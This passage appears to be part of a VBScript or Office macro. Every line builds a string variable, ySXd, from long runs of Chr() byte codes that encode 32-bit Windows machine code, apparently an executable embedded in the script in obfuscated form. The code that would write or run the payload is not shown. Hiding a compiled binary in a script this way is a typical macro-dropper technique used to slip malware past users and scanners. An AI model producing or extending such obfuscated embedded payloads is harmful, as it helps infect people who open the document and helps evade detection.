ySXd=ySXd&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(24)&Chr(235)&Chr(218)&Chr(139)&Chr(208)&Chr(56)&Chr(26)&Chr(116)&Chr(4)&Chr(66)&Chr(79)&Chr(117)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(238)&Chr(138)&Chr(14)&Chr(136)&Chr(10)&Chr(66)&Chr(70)&Chr(58)&Chr(203)&Chr(116)&Chr(3)&Chr(104)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(24)&Chr(232)&Chr(154)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(181)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(51)&Chr(219)&Chr(87)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(16)&Chr(57)&Chr(93)&Chr(12)&Chr(117)&Chr(18)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(59)&Chr(243)
ySXd=ySXd&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(88)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(225)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(213)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(202)&Chr(139)&Chr(85)&Chr(16)&Chr(59)&Chr(211)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(209)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(139)&Chr(198)&Chr(117)&Chr(15)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(30)&Chr(79)&Chr(117)&Chr(243)&Chr(235)&Chr(25)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(8)&Chr(79)&Chr(116)&Chr(5)&Chr(255)&Chr(77)&Chr(20)&Chr(117)&Chr(238)&Chr(57)&Chr(93)&Chr(20)
ySXd=ySXd&Chr(117)&Chr(2)&Chr(136)&Chr(24)&Chr(59)&Chr(251)&Chr(117)&Chr(139)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(117)&Chr(15)&Chr(139)&Chr(69)&Chr(12)&Chr(106)&Chr(80)&Chr(136)&Chr(92)&Chr(6)&Chr(255)&Chr(88)&Chr(233)&Chr(120)&Chr(255)&Chr(255)&Chr(255)&Chr(136)&Chr(30)&Chr(232)&Chr(222)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(130)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(36)&Chr(138)&Chr(1)&Chr(131)&Chr(193)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(78)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(1)&Chr(186)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(3)&Chr(208)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(194)&Chr(131)&Chr(193)&Chr(4)&Chr(169)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(232)&Chr(139)&Chr(65)&Chr(252)&Chr(132)&Chr(192)&Chr(116)&Chr(50)&Chr(132)&Chr(228)&Chr(116)&Chr(36)&Chr(169)&Chr(0)&Chr(0)&Chr(255)&Chr(0)&Chr(116)&Chr(19)&Chr(169)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(116)&Chr(2)&Chr(235)&Chr(205)&Chr(141)&Chr(65)&Chr(255)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(254)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(253)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(252)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)
ySXd=ySXd&Chr(139)&Chr(77)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(203)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(34)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(171)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(48)&Chr(139)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(25)&Chr(235)&Chr(218)&Chr(139)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(70)&Chr(58)&Chr(195)&Chr(116)&Chr(3)&Chr(79)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(25)&Chr(232)&Chr(231)&Chr(246)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(193)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)
ySXd=ySXd&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(86)&Chr(51)&Chr(246)&Chr(59)&Chr(206)&Chr(124)&Chr(30)&Chr(131)&Chr(249)&Chr(2)&Chr(126)&Chr(12)&Chr(131)&Chr(249)&Chr(3)&Chr(117)&Chr(20)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(40)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(27)&Chr(232)&Chr(165)&Chr(246)&Chr(255)&Chr(255)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(45)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(139)&Chr(241)&Chr(198)&Chr(70)&Chr(12)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(99)&Chr(232)&Chr(75)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(70)
ySXd=ySXd&Chr(8)&Chr(139)&Chr(72)&Chr(108)&Chr(137)&Chr(14)&Chr(139)&Chr(72)&Chr(104)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(14)&Chr(59)&Chr(13)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(7)&Chr(232)&Chr(22)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(139)&Chr(70)&Chr(4)&Chr(59)&Chr(5)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(139)&Chr(70)&Chr(8)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(2)&Chr(0)&Chr(0)&Chr(137)&Chr(70)&Chr(4)&Chr(139)&Chr(70)&Chr(8)&Chr(246)&Chr(64)&Chr(112)&Chr(2)&Chr(117)&Chr(20)&Chr(131)&Chr(72)&Chr(112)&Chr(2)&Chr(198)&Chr(70)&Chr(12)&Chr(1)&Chr(235)&Chr(10)&Chr(139)&Chr(8)&Chr(137)&Chr(14)&Chr(139)&Chr(64)&Chr(4)&Chr(137)
ySXd=ySXd&Chr(70)&Chr(4)&Chr(139)&Chr(198)&Chr(94)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(102)&Chr(255)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(244)&Chr(138)&Chr(85)&Chr(20)&Chr(132)&Chr(84)&Chr(1)&Chr(29)&Chr(117)&Chr(30)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(35)&Chr(69)&Chr(16)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(4)&Chr(106)
ySXd=ySXd&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(154)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(93)&Chr(195)&Chr(45)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(116)&Chr(34)&Chr(131)&Chr(232)&Chr(4)&Chr(116)&Chr(23)&Chr(131)&Chr(232)&Chr(13)&Chr(116)&Chr(12)&Chr(72)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(184)&Chr(4)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(18)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(4)&Chr(8)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(17)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(139)&Chr(240)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(141)&Chr(70)&Chr(28)&Chr(87)&Chr(80)&Chr(232)&Chr(234)&Chr(27)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(137)&Chr(126)&Chr(4)&Chr(137)&Chr(126)&Chr(8)&Chr(137)
ySXd=ySXd&Chr(126)&Chr(12)&Chr(193)&Chr(225)&Chr(16)&Chr(11)&Chr(193)&Chr(141)&Chr(126)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(185)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(141)&Chr(70)&Chr(28)&Chr(43)&Chr(206)&Chr(191)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(1)&Chr(136)&Chr(16)&Chr(64)&Chr(79)&Chr(117)&Chr(247)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(8)&Chr(136)&Chr(16)&Chr(64)&Chr(78)&Chr(117)&Chr(247)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(28)&Chr(5)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(87)&Chr(141)&Chr(133)&Chr(232)&Chr(250)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(118)&Chr(4)&Chr(255)&Chr(21)&Chr(168)&Chr(128)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(191)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(136)&Chr(132)&Chr(5)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(244)&Chr(138)&Chr(133)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(198)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(32)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(141)&Chr(157)&Chr(239)&Chr(250)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(200)&Chr(15)&Chr(182)&Chr(3)&Chr(59)&Chr(200)&Chr(119)&Chr(22)&Chr(43)&Chr(193)&Chr(64)&Chr(80)&Chr(141)&Chr(148)&Chr(13)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(106)&Chr(32)&Chr(82)&Chr(232)&Chr(39)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(67)&Chr(138)&Chr(3)&Chr(67)&Chr(132)&Chr(192)&Chr(117)&Chr(216)&Chr(106)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(141)&Chr(133)&Chr(252)
ySXd=ySXd&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(4)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(230)&Chr(33)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(87)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(199)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(68)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(104)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(162)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(51)&Chr(192)&Chr(15)&Chr(183)
ySXd=ySXd&Chr(140)&Chr(69)&Chr(252)&Chr(250)&Chr(255)&Chr(255)&Chr(246)&Chr(193)&Chr(1)&Chr(116)&Chr(14)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(16)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(235)&Chr(17)&Chr(246)&Chr(193)&Chr(2)&Chr(116)&Chr(21)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(32)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(136)&Chr(140)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(8)&Chr(198)&Chr(132)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(190)&Chr(235)&Chr(86)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(199)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(159)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(201)&Chr(41)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(149)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(141)&Chr(132)&Chr(14)&Chr(29)
ySXd=ySXd&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(208)&Chr(141)&Chr(90)&Chr(32)&Chr(131)&Chr(251)&Chr(25)&Chr(119)&Chr(12)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(16)&Chr(138)&Chr(209)&Chr(128)&Chr(194)&Chr(32)&Chr(235)&Chr(15)&Chr(131)&Chr(250)&Chr(25)&Chr(119)&Chr(14)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(32)&Chr(138)&Chr(209)&Chr(128)&Chr(234)&Chr(32)&Chr(136)&Chr(16)&Chr(235)&Chr(3)&Chr(198)&Chr(0)&Chr(0)&Chr(65)&Chr(59)&Chr(207)&Chr(114)&Chr(194)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(122)&Chr(23)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(70)&Chr(237)&Chr(255)&Chr(255)&Chr(232)&Chr(58)&Chr(234)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(71)&Chr(112)&Chr(116)&Chr(29)&Chr(131)&Chr(127)&Chr(108)&Chr(0)&Chr(116)
ySXd=ySXd&Chr(23)&Chr(139)&Chr(119)&Chr(104)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(157)&Chr(217)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(94)&Chr(237)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(13)&Chr(232)&Chr(97)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(137)&Chr(117)&Chr(228)&Chr(59)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(54)&Chr(133)&Chr(246)&Chr(116)&Chr(26)&Chr(86)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(76)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(71)&Chr(104)&Chr(139)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(86)&Chr(255)&Chr(21)
ySXd=ySXd&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(142)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(13)&Chr(232)&Chr(38)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(83)&Chr(51)&Chr(219)&Chr(83)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(48)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(29)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(254)&Chr(254)&Chr(117)&Chr(30)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(176)&Chr(128)&Chr(64)&Chr(0)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(69)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(235)&Chr(60)&Chr(131)&Chr(254)&Chr(253)&Chr(117)&Chr(18)&Chr(199)&Chr(5)&Chr(116)&Chr(178)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(172)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(219)&Chr(131)&Chr(254)&Chr(252)&Chr(117)&Chr(18)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(64)&Chr(4)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(196)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(198)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(32)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(139)&Chr(93)&Chr(12)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(87)&Chr(232)&Chr(100)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(51)&Chr(246)&Chr(137)&Chr(125)&Chr(8)&Chr(59)&Chr(254)&Chr(117)&Chr(14)&Chr(139)&Chr(195)&Chr(232)
ySXd=ySXd&Chr(183)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(233)&Chr(157)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(51)&Chr(192)&Chr(57)&Chr(184)&Chr(16)&Chr(168)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(69)&Chr(228)&Chr(131)&Chr(192)&Chr(48)&Chr(61)&Chr(240)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(231)&Chr(129)&Chr(255)&Chr(232)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(112)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(255)&Chr(233)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(100)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(199)&Chr(80)&Chr(255)&Chr(21)&Chr(180)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(82)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(87)&Chr(255)&Chr(21)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(51)&Chr(1)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(71)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(210)&Chr(66)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(115)&Chr(12)&Chr(57)&Chr(85)&Chr(232)&Chr(15)&Chr(134)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(125)&Chr(238)&Chr(0)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(117)&Chr(239)&Chr(138)&Chr(14)&Chr(132)&Chr(201)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(70)&Chr(255)&Chr(15)&Chr(182)&Chr(201)&Chr(233)&Chr(166)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(228)&Chr(131)&Chr(196)&Chr(12)&Chr(107)&Chr(201)&Chr(48)&Chr(137)&Chr(117)&Chr(224)
ySXd=ySXd&Chr(141)&Chr(177)&Chr(32)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(42)&Chr(138)&Chr(70)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(40)&Chr(15)&Chr(182)&Chr(62)&Chr(15)&Chr(182)&Chr(192)&Chr(235)&Chr(18)&Chr(139)&Chr(69)&Chr(224)&Chr(138)&Chr(128)&Chr(12)&Chr(168)&Chr(64)&Chr(0)&Chr(8)&Chr(68)&Chr(59)&Chr(29)&Chr(15)&Chr(182)&Chr(70)&Chr(1)&Chr(71)&Chr(59)&Chr(248)&Chr(118)&Chr(234)&Chr(139)&Chr(125)&Chr(8)&Chr(70)&Chr(70)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(209)&Chr(139)&Chr(117)&Chr(228)&Chr(255)&Chr(69)&Chr(224)&Chr(131)&Chr(198)&Chr(8)&Chr(131)&Chr(125)&Chr(224)&Chr(4)&Chr(137)&Chr(117)&Chr(228)&Chr(114)&Chr(233)&Chr(139)&Chr(199)&Chr(137)&Chr(123)&Chr(4)&Chr(199)&Chr(67)&Chr(8)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(103)&Chr(251)&Chr(255)&Chr(255)&Chr(106)&Chr(6)&Chr(137)&Chr(67)&Chr(12)&Chr(141)&Chr(67)
ySXd=ySXd&Chr(16)&Chr(141)&Chr(137)&Chr(20)&Chr(168)&Chr(64)&Chr(0)&Chr(90)&Chr(102)&Chr(139)&Chr(49)&Chr(65)&Chr(102)&Chr(137)&Chr(48)&Chr(65)&Chr(64)&Chr(64)&Chr(74)&Chr(117)&Chr(243)&Chr(139)&Chr(243)&Chr(232)&Chr(215)&Chr(251)&Chr(255)&Chr(255)&Chr(233)&Chr(183)&Chr(254)&Chr(255)&Chr(255)&Chr(128)&Chr(76)&Chr(3)&Chr(29)&Chr(4)&Chr(64)&Chr(59)&Chr(193)&Chr(118)&Chr(246)&Chr(70)&Chr(70)&Chr(128)&Chr(126)&Chr(255)&Chr(0)&Chr(15)&Chr(133)&Chr(52)&Chr(255)&Chr(255)&Chr(255)&Chr(141)&Chr(67)&Chr(30)&Chr(185)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(8)&Chr(8)&Chr(64)&Chr(73)&Chr(117)&Chr(249)&Chr(139)&Chr(67)&Chr(4)&Chr(232)&Chr(18)&Chr(251)&Chr(255)&Chr(255)&Chr(137)&Chr(67)&Chr(12)&Chr(137)&Chr(83)&Chr(8)&Chr(235)&Chr(3)&Chr(137)&Chr(115)&Chr(8)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(193)&Chr(225)&Chr(16)&Chr(11)
